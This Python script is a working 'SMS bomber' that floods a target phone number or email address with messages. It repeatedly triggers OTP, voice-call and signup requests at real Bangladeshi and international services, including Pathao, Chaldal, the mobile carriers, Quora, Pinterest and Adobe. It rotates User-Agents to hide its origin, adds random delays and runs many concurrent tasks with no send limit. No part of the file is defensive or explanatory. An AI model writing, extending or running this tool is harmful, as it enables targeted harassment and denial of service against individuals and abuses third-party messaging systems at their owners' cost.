import json
import asyncio
import aiohttp
import random
import string
import os
import sys
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Colors for terminal
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White

# List of random User-Agents to mask device identity
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
]

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║ {Y}   ____  __  __ ____    ____   ___  __  __ ____  _____ ____  {C}║
║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | | __ )| ____|  _ \ {C}║
║ {Y}  \___ \| |\/| \___ \  |  _ \| | | | |\/| | |  _ \| _| | |_) |{C}║
║ {Y}   ___) | |  | |___) | | |_) | |_| | |  | | | |_) | |___|  _ < {C}║
║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_| |____/|_____|_| \_\{C}║
║                                                              ║
║ {W}      Cross-Platform SMS Bomber (iOS, Android, Windows)      {C}║
║ {W}           Created for: a-Shell, Termux, Windows             {C}║
║ {G}           Security: Session, Smart Retry, Log, Jitter       {C}║
║ {P}           Engine: Asyncio & Aiohttp (High Speed)            {C}║
╚══════════════════════════════════════════════════════════════╝
    """)

def get_random_name():
    return ''.join(random.choices(string.ascii_letters, k=8))

def get_random_email():
    return f"{get_random_name()}@gmail.com"

def get_random_phone():
    return "01" + "".join(random.choices(string.digits, k=9))

class AsyncBomber:
    def __init__(self, target, limit, mode='sms', stop_event=None):
        self.target = target
        self.limit = limit # 0 means infinite
        self.mode = mode
        self.sent = 0
        self.failed = 0
        self.running = True
        self.stop_event = stop_event if stop_event else asyncio.Event()
        self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.session = None # aiohttp session will be created later
        self.api_cooldowns = {} # Tracks cooldown for each API
        self.backoff_time = 30 # Initial backoff time in seconds

        with open(self.log_file, "w") as f:
            f.write(f"Bombing Session Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {self.target} | Mode: {self.mode.upper()}\n")
            f.write("-" * 60 + "\n")

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()

    def get_headers(self, origin=None, referer=None, extra=None):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
            "Connection": "keep-alive"
        }
        if origin:
            headers["Origin"] = origin
        if referer:
            headers["Referer"] = referer
        if extra:
            headers.update(extra)
        return headers

    async def log_event(self, api_name, success, status_code=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        status = "SUCCESS" if success else "FAILED"
        log_entry = f"[{timestamp}] {api_name:15} | {status:7} | Code: {status_code}\n"

        with open(self.log_file, "a") as f:
            f.write(log_entry)

        if success:
            self.sent += 1
            color = G
            icon = "✓"
        else:
            self.failed += 1
            color = R
            icon = "✗"

        limit_str = "∞" if self.limit == 0 else str(self.limit)
        logging.info(f"{color}[{icon}] {timestamp} | {api_name:15} | {status:7} | Sent: {self.sent}/{limit_str}{W}")

    # --- SMS APIs ---
    async def api_sms1___redx_signup(self):
        url = "https://api.redx.com.bd/v1/user/signup"
        try:
            async with self.session.post(url, json={"phone": self.target, "name": get_random_name()}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("SMS1 - RedX Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("SMS1 - RedX Signup", False, "Error")
            return False

    async def api_sms2___bioscope_login(self):
        url = f"https://stage.bioscopelive.com/en/login/send-otp?phone=88{self.target}&operator=bd-otp"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("SMS2 - Bioscope Login", success, res.status)
                return success
        except Exception:
            await self.log_event("SMS2 - Bioscope Login", False, "Error")
            return False

    async def api_sms3___chaldal_otp(self):
        url = "https://chaldal.com/api/customer/SendOTP"
        try:
            async with self.session.post(url, json={"phoneNumber": self.target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("SMS3 - Chaldal OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("SMS3 - Chaldal OTP", False, "Error")
            return False

    async def api_sms4___pathao_otp(self):
        url = "https://api.pathao.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": self.target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("SMS4 - Pathao OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("SMS4 - Pathao OTP", False, "Error")
            return False

    async def api_sms5___sharetrip_otp(self):
        url = "https://api.sharetrip.net/api/v1/otp/send"
        try:
            async with self.session.post(url, json={"mobile": self.target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("SMS5 - ShareTrip OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("SMS5 - ShareTrip OTP", False, "Error")
            return False

    # --- Call APIs ---
    async def api_call1___robi_call_otp(self):
        url = "https://api.robi.com.bd/vas/v1/otp/send"
        try:
            async with self.session.post(url, json={"msisdn": self.target, "type": "voice"}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL1 - Robi Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL1 - Robi Call OTP", False, "Error")
            return False

    async def api_call2___banglalink_call_otp(self):
        url = "https://v-app.banglalink.net/api/v1/send-otp"
        try:
            async with self.session.post(url, json={"phone": self.target, "type": "voice"}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL2 - BL Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL2 - BL Call OTP", False, "Error")
            return False

    async def api_call3___gp_call_otp(self):
        url = "https://www.grameenphone.com/api/v1/otp/send"
        try:
            async with self.session.post(url, json={"phone": self.target, "method": "voice"}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL3 - GP Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL3 - GP Call OTP", False, "Error")
            return False

    async def api_call4___airtel_call_otp(self):
        url = "https://api.airtel.com.bd/vas/v1/otp/send"
        try:
            async with self.session.post(url, json={"msisdn": self.target, "type": "voice"}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL4 - Airtel Call OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("CALL4 - Airtel Call OTP", False, "Error")
            return False

    # --- Email APIs ---
    async def api_email1___quora_signup(self):
        url = "https://www.quora.com/api/v1/auth/signup"
        try:
            async with self.session.post(url, json={"email": self.target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201, 403] # 403 might mean already exists but email sent
                await self.log_event("EMAIL1 - Quora Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL1 - Quora Signup", False, "Error")
            return False

    async def api_email2___pinterest_signup(self):
        url = "https://www.pinterest.com/resource/UserRegisterResource/create/"
        try:
            async with self.session.post(url, data={"email": self.target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL2 - Pinterest Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL2 - Pinterest Signup", False, "Error")
            return False

    async def api_email3___adobe_signup(self):
        url = "https://auth.services.adobe.com/registration/v1/register"
        try:
            async with self.session.post(url, json={"email": self.target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL3 - Adobe Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL3 - Adobe Signup", False, "Error")
            return False

    async def bomb_task(self):
        if self.mode == 'sms':
            apis = [
                self.api_sms1___redx_signup, self.api_sms2___bioscope_login, self.api_sms3___chaldal_otp,
                self.api_sms4___pathao_otp, self.api_sms5___sharetrip_otp
            ]
        elif self.mode == 'call':
            apis = [
                self.api_call1___robi_call_otp, self.api_call2___banglalink_call_otp,
                self.api_call3___gp_call_otp, self.api_call4___airtel_call_otp
            ]
        else:
            apis = [
                self.api_email1___quora_signup, self.api_email2___pinterest_signup, self.api_email3___adobe_signup
            ]

        while self.running and not self.stop_event.is_set():
            if self.limit != 0 and self.sent >= self.limit:
                self.running = False
                break

            api = random.choice(apis)
            await api()
            await asyncio.sleep(random.uniform(2, 5))

async def main():
    while True:
        clear()
        banner()
        print(f"{C}[1] SMS Bombing")
        print(f"{C}[2] Call Bombing")
        print(f"{C}[3] Email Bombing")
        print(f"{C}[E] Exit")
        choice = input(f"\n{Y}[?] Select Mode: {W}").lower()

        if choice == 'e': break
        
        if choice in ['1', '2']:
            target = input(f"{C}[?] Enter Target Number: {W}")
            mode = 'sms' if choice == '1' else 'call'
        elif choice == '3':
            target = input(f"{C}[?] Enter Target Email: {W}")
            mode = 'email'
        else: continue

        limit = int(input(f"{C}[?] Limit (0 for ∞): {W}") or 0)
        tasks_count = int(input(f"{C}[?] Concurrency (e.g. 10): {W}") or 10)

        async with AsyncBomber(target, limit, mode) as bomber:
            tasks = [asyncio.create_task(bomber.bomb_task()) for _ in range(tasks_count)]
            print(f"{Y}[*] Bombing started. Press Enter to stop.{W}")
            await asyncio.to_thread(input, "")
            bomber.running = False
            for t in tasks: t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
        
        print(f"{G}[✓] Done! Sent: {bomber.sent}{W}")
        input("Press Enter to continue...")

if __name__ == "__main__":
    asyncio.run(main())
